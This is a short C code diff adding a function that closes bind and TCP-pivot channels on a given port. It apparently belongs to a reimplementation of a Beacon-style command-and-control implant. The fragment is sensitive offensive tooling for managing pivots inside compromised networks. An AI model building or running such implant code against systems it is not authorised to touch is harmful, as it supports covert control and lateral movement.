@@ -257,3 +257,17 @@ void ChannelSend(char* buffer, int length)
 		}
 	}
 }
+
+void ChannelLSocketClose(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short port = BeaconDataShort(&parser);
+
+	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
+	{
+		if (channel->state != CHANNEL_STATE_0 && channel->port == port)
+			if (channel->type == CHANNEL_TYPE_BIND || channel->type == CHANNEL_TYPE_TCP_PIVOT)
+				channel->state = CHANNEL_STATE_0;
+	}
+}
